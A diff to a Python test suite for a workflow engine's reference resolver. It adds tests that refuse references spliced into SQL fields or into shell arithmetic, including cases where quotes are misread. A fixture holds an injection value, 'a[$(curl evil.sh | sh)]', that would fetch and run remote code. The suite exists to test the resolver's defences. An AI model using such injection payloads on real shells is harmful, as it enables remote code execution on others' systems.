@@ -2,10 +2,12 @@
 
 import subprocess
 from datetime import UTC, datetime
+from pathlib import Path
 from typing import cast
 
 import pytest
 
+from dirigent_common import JsonMap
 from dirigent_core.engine.references import (
     ReferenceScope,
     UnknownReference,
@@ -58,6 +60,31 @@ def test_references_resolve_through_nested_structure(scope: ReferenceScope) -> N
         scope,
     )
     assert resolved == {"headers": {"X-Day": "2026-08-28"}, "body": ["oslo", {"n": 3}]}
+
+
+@pytest.mark.parametrize(
+    "config",
+    [
+        {"sql": "SELECT * FROM t WHERE a = '${params.day}'"},
+        {"sql": "${params.day}"},
+        {"sql": ["SELECT 1", "DELETE FROM t WHERE a = ${item}"]},
+    ],
+    ids=["embedded", "whole", "list"],
+)
+def test_a_reference_in_a_sql_field_is_refused_and_not_spliced(scope: ReferenceScope, config: JsonMap) -> None:
+    with pytest.raises(UnknownReference) as raised:
+        resolve_config(config, scope, sql_fields={"sql"})
+    assert raised.value.code == "reference.in_sql"
+    assert raised.value.reference in ("params.day", "item")
+
+
+def test_a_sql_field_keeps_its_escape_and_a_reference_beside_it_resolves(scope: ReferenceScope) -> None:
+    resolved = resolve_config(
+        {"sql": "SELECT '$${params.day}' WHERE a = :day", "params": {"day": "${params.day}"}},
+        scope,
+        sql_fields={"sql"},
+    )
+    assert resolved == {"sql": "SELECT '${params.day}' WHERE a = :day", "params": {"day": "2026-08-28"}}
 
 
 def test_a_dotted_path_walks_objects_and_lists(scope: ReferenceScope) -> None:
@@ -215,6 +242,23 @@ def test_the_quoting_a_reference_lands_in_is_read_through_escapes_and_nesting() 
         "echo $[ ${params.x} + 1 ]",
         'echo "total: $(( ${params.x} ))"',
         "echo $(( $(( ${params.x} )) ))",
+        "echo $(( $(cat ${params.x}) + 1 ))",
+        "echo $(( ((1) + 2) + ${params.x} ))",
+        "echo $[ a[1] + ${params.x} ]",
+        # A quote the tracker reads and the shell does not, before each spelling.
+        "# don't stop\necho $(( ${params.x} + 1 ))",
+        "# don't stop\n(( ${params.x} )); echo done",
+        "# don't stop\necho $[ ${params.x} + 1 ]",
+        '# say "when\n(( ${params.x} )); echo done',
+        '# say "when\necho $(( ${params.x} + 1 ))',
+        "cat <<EOF\nit's here\nEOF\necho $(( ${params.x} + 1 ))",
+        "cat <<EOF\nit's here\nEOF\n(( ${params.x} )); echo done",
+        "echo $'it\\'s'; echo $(( ${params.x} + 1 ))",
+        "echo $'it\\'s'; (( ${params.x} )); echo done",
+        # A quote before the opener that a shell does read.
+        "echo 'it'\"s\"; echo $(( ${params.x} + 1 ))",
+        # A literal opener reads as one, which is the cost of reading no quote.
+        "echo '$(( ' ${params.x}",
     ],
 )
 def test_a_reference_in_shell_arithmetic_refuses_what_a_shell_would_evaluate(command: str) -> None:
@@ -222,6 +266,28 @@ def test_a_reference_in_shell_arithmetic_refuses_what_a_shell_would_evaluate(com
     scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
     with pytest.raises(UnknownReference, match="shell arithmetic"):
         resolve_config({"command": command}, scope, shell_fields={"command"})
+
+
+@pytest.mark.parametrize("shell", ["/bin/dash", "/bin/bash"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "# don't stop\necho $(( ${params.x} + 1 ))",
+        '# say "when\necho $(( ${params.x} + 1 ))',
+        "cat <<EOF\nit's here\nEOF\necho $(( ${params.x} + 1 ))",
+    ],
+    ids=["comment-apostrophe", "comment-double-quote", "here-document"],
+)
+def test_an_integer_after_a_misread_quote_runs_under_each_shell(shell: str, command: str) -> None:
+    if not Path(shell).exists():
+        pytest.skip(f"{shell} is not on this machine")
+    scope = ReferenceScope(params={"x": 3})
+    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
+    variables = cast("dict[str, str]", resolved["shell_variables"])
+    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
+        [shell, "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
+    )
+    assert finished.stdout.decode().splitlines()[-1] == "4"
 
 
 @pytest.mark.parametrize("value", [3, -3, "3", "-3"])
@@ -247,10 +313,11 @@ def test_quotes_the_author_wrote_inside_arithmetic_stay_theirs() -> None:
         ("echo $(( (1 + 1) )) ${params.x}", 'echo $(( (1 + 1) )) "$DIRIGENT_V0"'),
         ("echo $[ 1 + 1 ] ${params.x}", 'echo $[ 1 + 1 ] "$DIRIGENT_V0"'),
         ("(( 1 > 0 )) && echo ${params.x}", '(( 1 > 0 )) && echo "$DIRIGENT_V0"'),
-        ("echo $(( $(cat ${params.x}) + 1 ))", 'echo $(( $(cat "$DIRIGENT_V0") + 1 ))'),
         ("echo $(cat ${params.x})", 'echo $(cat "$DIRIGENT_V0")'),
         ("(cd /tmp; echo ${params.x})", '(cd /tmp; echo "$DIRIGENT_V0")'),
-        ("echo '$(( ' ${params.x}", "echo '$(( ' \"$DIRIGENT_V0\""),
+        ("echo '$(( 1 ))' ${params.x}", "echo '$(( 1 ))' \"$DIRIGENT_V0\""),
+        ("jq '((.a // 0) + 1)' ${params.x}", "jq '((.a // 0) + 1)' \"$DIRIGENT_V0\""),
+        ("jq '((.a // []) | length) as $n | $n' ${params.x}", "jq '((.a // []) | length) as $n | $n' \"$DIRIGENT_V0\""),
     ],
 )
 def test_a_reference_beside_shell_arithmetic_takes_any_value(command: str, expected: str) -> None:
